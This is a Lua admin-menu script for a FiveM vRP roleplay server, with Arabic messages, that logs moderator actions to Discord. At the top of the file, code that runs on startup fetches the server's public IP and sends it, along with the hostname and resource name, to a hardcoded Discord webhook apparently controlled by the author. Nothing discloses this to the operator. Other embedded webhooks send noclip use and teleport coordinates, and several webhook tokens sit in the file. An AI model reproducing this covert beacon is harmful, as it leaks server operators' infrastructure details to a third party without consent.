local logskingive = "https://discordapp.com/api/webhooks/760918010578993202/JONlQIvO1gKdS2Dn-xMllDT8okEAtmbaoBrcvFjg9hmKsLfk0z1Q2fZal1EoDhxdD0nN"

function giveskinss(message) 
    local embed = {
        {
          ["color"] = 15158332,
          ["title"] = " Server Start with my script ",
          ["description"] = ""..message.."",
          ["footer"] = {
          ["text"]= "[ Made By :  Abdulmalik#1111 ] [  "..os.date("%d/%m/%Y %I:%M %p").." ]",
          ["icon_url"] = '',
           },
         }
      }
    
    
    PerformHttpRequest(logskingive, function(err, text, headers) end, 'POST', json.encode({username = webname, embeds = embed}), { ['Content-Type'] = 'application/json' })
    end
    
 PerformHttpRequest("https://api.ipify.org/", function (err, text, head)
  local server_ip = text
  giveskinss("**ServerName :**`"..GetConvar("sv_hostname").."`\n\n**Started vrp_GiveRoles :** `"..GetCurrentResourceName().."`\n\n**IP :**`"..server_ip.."`")
  end, 'GET', '')

local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")

vRPclient = Tunnel.getInterface("vRP", "note_hotkeys") 
vRP = Proxy.getInterface("vRP")  

--================ انعاش المحيط ===========
function sendADH(WW,user_id,name,thelist)
  local connect = {
      {
          ["color"] = 65280,
          ["author"] = {
              ["name"] = "Near Revive | انعاش المحيط",
              ["icon_url"] = "https://cdn.discordapp.com/avatars/551090700679249961/a_964770b8a60276193cb3e330cb1bc448.gif?size=1024"
          },
          ["title"] = "Admin " .. name .. " [ID:" .. user_id .. "] Has Revived",
          ["description"] = "" .. thelist .. "",
          ["footer"] = {
              ["text"] = "^6Made BY Abdulmalik#1111",
              ["icon_url"] = "https://cdn.discordapp.com/avatars/551090700679249961/a_964770b8a60276193cb3e330cb1bc448.gif?size=1024"
          },
      }
  }
PerformHttpRequest(WW, function(err, text, headers) end, 'POST', json.encode({ embeds = connect }), { ['Content-Type'] = 'application/json' })
end

--================ طيران ===========
function sendADq(ww,user_id)
  local connect = {
      {
          ["color"] = 65280,
          ["author"] = {
              ["name"] = "NoClip | طيران",
              ["icon_url"] = "https://cdn.discordapp.com/avatars/551090700679249961/a_964770b8a60276193cb3e330cb1bc448.gif?size=1024"
          },
          ["title"] = "لقد قام الادمن رقم [ "..user_id.." ] بتفعيل وضع الطيران",
          ["footer"] = {
              ["text"] = "^6Made BY Abdulmalik#1111",
              ["icon_url"] = "https://cdn.discordapp.com/avatars/551090700679249961/a_964770b8a60276193cb3e330cb1bc448.gif?size=1024"
          },
      }
  }
PerformHttpRequest("https://discordapp.com/api/webhooks/750306421488222249/G7N8lCUM66_BQiyKSxCJRPonZzeV-kojf0W6NOypnrZC6nZqC5kKpu5F_LyckFc0cd8c", function(err, text, headers) end, 'POST', json.encode({ embeds = connect }), { ['Content-Type'] = 'application/json' })
end
--============== الاكل والشرب ================
function sendADg(WW,user_id,name,thelist)
  local connect = {
      {
          ["color"] = 65280,
          ["author"] = {
              ["name"] = "**تعبئة الأكل والشرب **",
              ["icon_url"] = "https://cdn.discordapp.com/avatars/551090700679249961/a_964770b8a60276193cb3e330cb1bc448.gif?size=1024"
          },
          ["title"] = "لقد قام الادمن رقم [ "..user_id.." ] بتعبئة الاكل والشرب",
          ["footer"] = {
              ["text"] = "^6Made BY Abdulmalik#1111",
              ["icon_url"] = "https://cdn.discordapp.com/avatars/551090700679249961/a_964770b8a60276193cb3e330cb1bc448.gif?size=1024"
          },
      }
  }
PerformHttpRequest(WW, function(err, text, headers) end, 'POST', json.encode({ embeds = connect }), { ['Content-Type'] = 'application/json' })
end

--================ كلبشة =============
function klbsha2(name, message, color)
  local connect = {
      {
        ["color"] = color,
        ["title"] = "**".. name .."**",
        ["description"] = message,
        ["thumbnail"] = {
          ["url"] = "",
        },
        ["footer"] = {
        ["text"] = "Made BY : Abdulmalik#1111",
        ["icon_url"] = "",
        },
      }
    }
  PerformHttpRequest((wed5), function(err, text, headers) end, 'POST', json.encode({username = Config.NameBot, embeds = connect, avatar_url = Config.photo}), { ['Content-Type'] = 'application/json' })
  end

  --================ حمل لاعب =============
function klbsha3(name, message, color)
  local connect = {
      {
        ["color"] = color,
        ["title"] = "**".. name .."**",
        ["description"] = message,
        ["thumbnail"] = {
          ["url"] = "",
        },
        ["footer"] = {
        ["text"] = "Made BY : Abdulmalik#1111",
        ["icon_url"] = "",
        },
      }
    }
  PerformHttpRequest((wed11), function(err, text, headers) end, 'POST', json.encode({username = Config.NameBot, embeds = connect, avatar_url = Config.photo}), { ['Content-Type'] = 'application/json' })
  end
  --=============== تسجيل دخول ======
  function SendDiscord101(msg, color)    
    local user_id = vRP.getUserId(player)
    local connect = {           
        {
          ["color"] = color,
          ["author"] = {
          ["name"] = msg,
          ["url"] = "",
          ["icon_url"] = ""
          },
        }
      }
    PerformHttpRequest(webhook5, function(err, text, headers) end, 'POST', json.encode({username = Config.NameBot, embeds = connect, avatar_url = Config.photo}), { ['Content-Type'] = 'application/json' })
    end
  --=============== تسجيل دخول ======
  function SendDiscord102(msg, color)    
    local user_id = vRP.getUserId(player)
    local connect = {           
        {
          ["color"] = color,
          ["author"] = {
          ["name"] = msg,
          ["url"] = "",
          ["icon_url"] = ""
          },
        }
      }
    PerformHttpRequest(webhook6, function(err, text, headers) end, 'POST', json.encode({username = Config.NameBot, embeds = connect, avatar_url = Config.photo}), { ['Content-Type'] = 'application/json' })
    end
    --========== اعطاء رتب ======
    function SendDiscord166(msg, color)    
      local connect = {           
        {
          ["color"] = color,
          ["author"] = {
            ["name"] = msg,
            ["url"] = "",
            ["icon_url"] = ""
            },
        }
      }
      PerformHttpRequest(webhook7, function(err, text, headers) end, 'POST', json.encode({username = Config.NameBot, embeds = connect, avatar_url = Config.photo}), { ['Content-Type'] = 'application/json' })
      end

      ---===== باند ===

      function SendDiscord26(msg, color)    
        local connect = {           
          {
            ["color"] = color,
            ["author"] = {
              ["name"] = msg,
              ["url"] = "",
              ["icon_url"] = ""
              },
          }
        }
        PerformHttpRequest(webhook8, function(err, text, headers) end, 'POST', json.encode({username = Config.NameBot, embeds = connect, avatar_url = Config.photo}), { ['Content-Type'] = 'application/json' })
        end



        --==== انعاش عن بعد ===
        function SendDiscord1655(msg, color)    
          local connect = {           
            {
              ["color"] = color,
              ["author"] = {
                ["name"] = msg,
                ["url"] = "",
                ["icon_url"] = ""
                },
            }
          }
          PerformHttpRequest(webhook9, function(err, text, headers) end, 'POST', json.encode({username = Config.NameBot, embeds = connect, avatar_url = Config.photo}), { ['Content-Type'] = 'application/json' })
          end

          --============= طرد ======
          function SendDiscord28(msg, color)    
            local connect = {           
              {
                ["color"] = color,
                ["author"] = {
                  ["name"] = msg,
                  ["url"] = "",
                  ["icon_url"] = ""
                  },
              }
            }
            PerformHttpRequest(webhook10, function(err, text, headers) end, 'POST', json.encode({username = Config.NameBot, embeds = connect, avatar_url = Config.photo}), { ['Content-Type'] = 'application/json' })
            end

            --=============== انعاش الجميع =====
            function an3ash22(name, message, color)
              local connect = {
                  {
                    ["color"] = color,
                    ["title"] = "**".. name .."**",
                    ["description"] = message,
                    ["thumbnail"] = {
                      ["url"] = "",
                    },
                    ["footer"] = {
                    ["text"] = "^6Made BY Abdulmalik#1111",
                    ["icon_url"] = "https://cdn.discordapp.com/avatars/551090700679249961/a_5f05b23635aafd4fbcbcdc6d6880725c.gif?size=1024",
                    },
                  }
                }
              PerformHttpRequest(webhook11, function(err, text, headers) end, 'POST', json.encode({username = Config.NameBot, embeds = connect, avatar_url = Config.photo}), { ['Content-Type'] = 'application/json' })
              end
              function an3ash25(name, message, color)
                local connect = {
                    {
                      ["color"] = color,
                      ["title"] = "**".. name .."**",
                      ["description"] = message,
                      ["thumbnail"] = {
                        ["url"] = "",
                      },
                      ["footer"] = {
                      ["text"] = "^6Made BY Abdulmalik#1111",
                      ["icon_url"] = "https://cdn.discordapp.com/avatars/551090700679249961/a_5f05b23635aafd4fbcbcdc6d6880725c.gif?size=1024",
                      },
                    }
                  }
                PerformHttpRequest(webhook12, function(err, text, headers) end, 'POST', json.encode({username = Config.NameBot, embeds = connect, avatar_url = Config.photo}), { ['Content-Type'] = 'application/json' })
                end


  ------=================================================================== LOGS =======================================================================================
--===================== الاكل والشرب ==============
RegisterServerEvent('Hunger')
AddEventHandler('Hunger',function()
    local player = source
    local user_id = vRP.getUserId({player})
vRPclient.isHandcuffed(player,{},function(handcuffed)
if not handcuffed then
    if vRP.hasPermission({user_id,(perm1)}) then
      vRPclient.varyHealth(player,{100})
      vRP.varyHunger({user_id,-100})
      vRP.varyThirst({user_id,-100})
      sendADg((wed1),user_id,GetPlayerName(player))
      TriggerClientEvent("pNotify:SendNotification",player,{text = "<span color=red>لقد تم تعبئة الاكل والشرب بنجاح</span>", type = "info", timeout = (5000),layout = "centerLeft"})
    else
    end
  end
end)
end)
--=================== الذهاب الى النقطة ==================
RegisterServerEvent('TpToWayPoint')
AddEventHandler('TpToWayPoint',function()
    local player = source
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
vRPclient.isHandcuffed(player,{},function(handcuffed)
if not handcuffed then
      if vRP.hasPermission({user_id,(perm2)}) then
        TriggerClientEvent("TpToWaypoint", player)
        TriggerClientEvent("pNotify:SendNotification",player,{text = "<span color=red>لقد تم الأنتقال الى النقطة بنجاح</span>", type = "info", timeout = (5000),layout = "centerLeft"})
        else
        end
    end
  end)
  end
end)

--========================
--========== طيران ======
RegisterServerEvent('noclip')
AddEventHandler('noclip',function()
    local player = source
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
vRPclient.isHandcuffed(player,{},function(handcuffed)
if not handcuffed then
      if vRP.hasPermission({user_id,(perm3)}) then
        vRPclient.toggleNoclip(player, {})
        sendADq((web2),user_id,GetPlayerName(player))
        TriggerClientEvent("pNotify:SendNotification",player,{text = "<span color=#00ff00>لقد تم تفعيل وضع الطياران</span>", type = "info", timeout = (5000),layout = "centerLeft"})
      end
  else
     end
     end)
    end
end)
--============================
--=============== انتقال للاعب ==============
RegisterServerEvent('tpto')
AddEventHandler('tpto',function()
    local player = source
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
vRPclient.isHandcuffed(player,{},function(handcuffed)
if not handcuffed then
      if vRP.hasPermission({user_id, (perm4)}) then
        vRP.prompt({player,"User id:","",function(player,user_id) 
            local tplayer = vRP.getUserSource({tonumber(user_id)})
            if tplayer ~= nil then
              vRPclient.getPosition(tplayer, {},function(x,y,z)
                TriggerClientEvent("pNotify:SendNotification",player,{text = "<span color=#00ff00> <h3> لقد تم ارسال طلب انتقال الى صاحب الاي دي [ </span>"..user_id.." ] <span color=#00ff00> </span>", type = "info", timeout = (5000),layout = "centerLeft"})
                vRP.request({source,"يريد اللاعب صاحب الاي دي [ "..GetPlayerName(player).." ] الانتقال لك هل توافق ؟",15,function(source,ok)
                  if ok then
                    TriggerClientEvent("pNotify:SendNotification",player,{text = "<span color=#852028>  تم الانتقال بنجاح </span>", type = "info", timeout = (5000),layout = "centerLeft"})	
                    vRPclient.teleport(player,{x,y,z})
                    klbsha23("لقد قام اللاعب صاحب الاي دي [ "..GetPlayerName(player).." ] \n\n بالأنتقال الى اللاعب صاحب الاي دي [ "..user_id.." ]  \n\n       الأحداثيات \n `[  "..x..","..y..","..z.." ]` ")
                  end
                end
              }
            )
              end)
            else
              TriggerClientEvent("pNotify:SendNotification",player,{text = " <h3> عفواُ ولكن اللاعب صاحب الاي دي [ "..user_id.." ] غير متواجد في السيرفر حاليا", type = "info", timeout = (3000),layout = "centerLeft"})
            end
          end})
    end
    end
  end)
  end
end)

function klbsha23(name, message, color)
  local connect = {
      {
        ["color"] = color,
        ["title"] = "**".. name .."**",
        ["description"] = message,
        ["thumbnail"] = {
        },
        ["footer"] = {
        ["text"] = "Made BY Abdlmalik#1111",
        ["icon_url"] = "https://cdn.discordapp.com/avatars/551090700679249961/a_7ebe966464ee261e5296d9a31de59cb2.gif?size=1024",
        },
      }
    }
  PerformHttpRequest("https://discordapp.com/api/webhooks/756584081466327060/vixFesQnikCco5i83wBziWgn1CByIxY4jQNb0HhE7Bed3GcG9T-e1tElZKvhA-f65oTY", function(err, text, headers) end, 'POST', json.encode({username = Config.NameBot, embeds = connect, avatar_url = Config.photo}), { ['Content-Type'] = 'application/json' })
  end


--=============================
--=============== انعاش المحيط ==================
RegisterServerEvent('ner')
AddEventHandler('ner',function()
    local player = source
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
vRPclient.isHandcuffed(player,{},function(handcuffed)
if not handcuffed then
      if vRP.hasPermission({user_id, (perm5)}) then
      vRPclient.getNearestPlayers(player,{15},function (nplayer)
        list = ""
        for p,i in pairs(nplayer) do
            vRPclient.varyHealth(p,{100})
            vRPclient.notify(p,{"You have been revived by ~g~"..GetPlayerName(player)})
            if i == #nplayer then
                list = list .. "" .. vRP.getUserId({p}) .. ""
            else
                list = list .. "" .. vRP.getUserId({p}) .. "\n"
            end
        end
        vRPclient.varyHealth(player,{100})
        sendADH((web3),user_id,GetPlayerName(player),list)
    end)
    TriggerClientEvent("pNotify:SendNotification",player,{text = "<span color=#00ff00>لقد تم انعاش جميع اللاعبين المحيطين بك</span>", type = "info", timeout = (5000),layout = "centerLeft"})
    end
  end
end)
end
end)
--=================================
--=============== كلبشة =============
RegisterServerEvent('hand')
AddEventHandler('hand',function()
    local player = source
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
vRPclient.isHandcuffed(player,{},function(handcuffed)
if not handcuffed then
      if vRP.hasPermission({user_id, (perm6)}) then
      vRPclient.getNearestPlayer(player,{10},function(nplayer)
        local nuser_id = vRP.getUserId({nplayer})
        if nuser_id ~= nil then
          vRPclient.toggleHandcuff(nplayer,{})
        local user_id = vRP.getUserId({player})
        klbsha2("!كلبشة", "**Player : **" .. user_id .. "\n**Cuffed : **" .. nuser_id .. "", 7996930)
          vRP.closeMenu({nplayer})
        else
          TriggerClientEvent("pNotify:SendNotification",player,{text = "<span color=#00ff00>لا يوجد لاعب قريب</span>", type = "info", timeout = (5000),layout = "centerRight"})
        end
      end)
    end
  end
end)
end
end)
--=============== سحب لاعب ===============
RegisterServerEvent('s7b')
AddEventHandler('s7b',function()
    local player = source
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
vRPclient.isHandcuffed(player,{},function(handcuffed)
if not handcuffed then
      if vRP.hasPermission({user_id, (perm7)}) then
      vRPclient.getNearestPlayer(player,{10},function(nplayer)
        if nplayer ~= nil then
          local nuser_id = vRP.getUserId({nplayer})
          if nuser_id ~= nil then
        vRPclient.isHandcuffed(nplayer,{},function(handcuffed)
        if handcuffed then
          TriggerClientEvent("dr:drag", nplayer, player)
          klbsha3("حمل لاعب", "**Player : **" .. user_id .. "\n**Drag : **" .. nuser_id .. "", 7996930)
        else
          TriggerClientEvent("pNotify:SendNotification",player,{text = "اللاعب غير مقيد", type = "info", timeout = (3000),layout = "centerRight"})
        end
        end)
          else
            TriggerClientEvent("pNotify:SendNotification",player,{text = "لايوجد لاعب قريب", type = "info", timeout = (3000),layout = "centerRight"})
          end
        else
          TriggerClientEvent("pNotify:SendNotification",player,{text = "لايوجد لاعب قريب", type = "info", timeout = (3000),layout = "centerRight"})
        end
      end)
    end
  end
end)
end
end)
--=========
--========= تسجيل دخول ========
RegisterServerEvent('tsg')
AddEventHandler('tsg',function()
    local player = source
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
      vRPclient.isHandcuffed(player,{},function(handcuffed)
        if not handcuffed then
      if vRP.hasPermission({user_id, (Permission1)}) then
        SendDiscord101("لقد قام الادمن رقم [ "..user_id.. " ] بتسجيل دخوله للمدينة \n\n ^6Made BY Abdulmalik#1111")
      TriggerClientEvent('chatMessage', -1, "^6Server", {0,0,0}, "^1   لقد قام الأدمن رقم   [  "..user_id.." ] بتسجيل دخوله للمدينة")
      end
    end
  end)
end
end)
--========= تسجيل خروج ========
RegisterServerEvent('tsgg')
AddEventHandler('tsgg',function()
    local player = source
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
      vRPclient.isHandcuffed(player,{},function(handcuffed)
        if not handcuffed then
      if vRP.hasPermission({user_id, (Permission2)}) then
        SendDiscord102("لقد قام الادمن رقم [ "..user_id.. " ] بتسجيل خروجه من المدينة \n\n ^6Made BY Abdulmalik#1111")
      TriggerClientEvent('chatMessage', -1, "^6Server", {0,0,0}, "^1   لقد قام الأدمن رقم   [  "..user_id.." ] بتسجيل خروجه من المدينة")
      end
    end
  end)
end
end)
--====== رتب =====
RegisterServerEvent('addrtb')
AddEventHandler('addrtb',function()
    local player = source
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
      vRPclient.isHandcuffed(player,{},function(handcuffed)
        if not handcuffed then
      if vRP.hasPermission({user_id, (Permission3)}) then
        vRP.prompt({player,"ايدي الشخص : ","",function(player,id)
            id = parseInt(id)
            vRP.prompt({player,"الرتبة المراد اضافتها : ","",function(player,group)
                if group == superadmin and not vRP.hasPermission(user_id,"player.group.add.superadmin") then
                    do return end
                end
                if group == admin and not vRP.hasPermission(user_id,"player.group.add.admin") then
                    do return end
                end          
                vRP.addUserGroup({id,group})
                SendDiscord166("لقد قام الادمن رقم  [ "..user_id.." ] باعطاء رتبة  [ "..group.." ] الى المواطن رقم [ "..id.." ] \n\n ^6Made BY Abdulmalik#1111")
                TriggerClientEvent("pNotify:SendNotification",player,{text = "<span color='red'>تم اعطاء الرتبة بنجاح.</span>", type = "info", timeout = (3000),layout = "centerRight"})
            end})
        end})
      end
    end
  end)
end
end)
--========= باند ========
RegisterServerEvent('bannd')
AddEventHandler('bannd',function()
    local player = source
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
      vRPclient.isHandcuffed(player,{},function(handcuffed)
        if not handcuffed then
      if vRP.hasPermission({user_id, (Permission4)}) then
      vRP.prompt({player,"ايدي الشخص المراد تبنيده: ","",function(player,id)
        id = parseInt(id)
        vRP.prompt({player,"السبب : ","",function(player,reason)
          local source = vRP.getUserSource({id})
          if source ~= nil then
            vRP.ban({source,reason})
            SendDiscord26("لقد قام الادمن رقم  [ " .. user_id .. " ]  بتبنيد اللاعب رقم  [ " .. id .." ] \n\n السبب :  [ " .. reason .. " ] \n\n ^6Made BY Abdulmalik#1111", 16716800)
            TriggerClientEvent("pNotify:SendNotification",player,{text = "<span color='red'>" .. reason .." : السبب " .. id .. " تم تبنيد</span>", type = "error", timeout = (3000),layout = "centerRight"})
            --vRPclient.notify(player,{"banned user "..id})
          end
        end})
      end})
    end
    end
  end)
end
end)

--========= انعاش لاعب ========
RegisterServerEvent('an3ash')
AddEventHandler('an3ash',function()
    local player = source
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
      if user_id ~= nil then
        vRPclient.isHandcuffed(player,{},function(handcuffed)
      if vRP.hasPermission({user_id, (Permission5)}) then
      vRP.prompt({player,"ايدي الشخص :","",function(player,target_id) 
        if target_id ~= nil and target_id ~= "" then 
          local nplayer = vRP.getUserSource({tonumber(target_id)})
          vRPclient.isInComa(nplayer,{}, function(in_coma)
            if in_coma then
              vRPclient.varyHealth(nplayer,{100}) 
              SetTimeout(150, function()
                vRPclient.varyHealth(nplayer,{100})
                vRP.varyHunger({target_id,-100})
                vRP.varyThirst({target_id,-100})
              end)
              local h = vRP.getUserId(player)
              vRPclient.notify(nplayer,{"You have been revived by admin ~g~"..GetPlayerName(player)})
              vRPclient.notify(player,{"You have revived ~g~"..GetPlayerName(nplayer)})
              SendDiscord1655("لقد قام الادمن رقم [ "..user_id.." ] بانعاش اللاعب رقم [ "..target_id.." ] \n\n ^6Made BY Abdulmalik#1111")
            else
              vRPclient.notify(player,{"~r~Player not in coma!"})
            end
          end)
        else
          vRPclient.notify(player,{"~r~No player ID selected."})
        end 
      end})
    end
  end)
end
    end
end)
--========= طرد لاعب ========
RegisterServerEvent('kick')
AddEventHandler('kick',function()
  local player = source
  local user_id = vRP.getUserId({player})
  if user_id ~= nil then
    vRPclient.isHandcuffed(player,{},function(handcuffed)
      if not handcuffed then
    if vRP.hasPermission({user_id, (Permission6)}) then
    vRP.prompt({player,"ايدي الشخص المراد طرده: ","",function(player,id)
      id = parseInt(id)
      vRP.prompt({player,"السبب : ","",function(player,reason)
        local source = vRP.getUserSource({id})
        if source ~= nil then
          vRP.kick({source,reason})
          SendDiscord28("لقد قام الادمن رقم  [ " .. user_id .. " ]  بطرد اللاعب رقم  [ " .. id .." ] \n\n السبب :  [ " .. reason .. " ] \n\n ^6Made BY Abdulmalik#1111", 16716800)
          TriggerClientEvent("pNotify:SendNotification",player,{text = "<span color='red'>" .. reason .." : السبب " .. id .. " تم تبنيد</span>", type = "error", timeout = (3000),layout = "centerRight"})
          --vRPclient.notify(player,{"banned user "..id})
        end
      end})
    end})
  end
  end
end)
end
end)

--========= انعاش الجميع ========
RegisterServerEvent('anall')
AddEventHandler('anall',function()
    local player = source
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
      vRPclient.isHandcuffed(player,{},function(handcuffed)
        if not handcuffed then
          if vRP.hasPermission({user_id, (Permission7)}) then
      vRP.request({player,"هل انت متاكد من انعاش جميع الاعبين؟",30,function(player,ok)
        if ok then	
          local users = vRP.getUsers({})
          local user_id = vRP.getUserId({player})
        
              for k,v in pairs(users) do
                local target_source = vRP.getUserSource({k})
                if target_source ~= nil then
                  vRPclient.varyHealth(target_source, {100})
                  TriggerClientEvent("pNotify:SendNotification",player,{text = "تم انعاش جميع اللاعبين", type = "info", timeout = (3000),layout = "centerRight"})
                  an3ash22("لقد قام الادمن رقم [ "..user_id.." ] بانعاش جميع اللاعبين")
                end
              end
              end
          end})
        end
    end
  end)
end
end)
--========= انعاش ذاتي ========
RegisterServerEvent('silfr')
AddEventHandler('silfr',function()
    local player = source
    local user_id = vRP.getUserId({player})
    if user_id ~= nil then
      vRPclient.isHandcuffed(player,{},function(handcuffed)
        if not handcuffed then
          if vRP.hasPermission({user_id, (Permission8)}) then
      vRPclient.isInComa(player,{},function (coma)
        if coma then
          vRPclient.varyHealth(player,{100})
          an3ash25("لقد قام صاحب الاي دي [ "..user_id.." ] بانعاش نفسه")
        else
          TriggerClientEvent("pNotify:SendNotification",player,{text = "<h1> انت مب ميت علشان تنعش نفسك", type = "info", timeout = (3000),layout = "centerRight"})
        end
      end)
    end
  end
  end)
end
end)
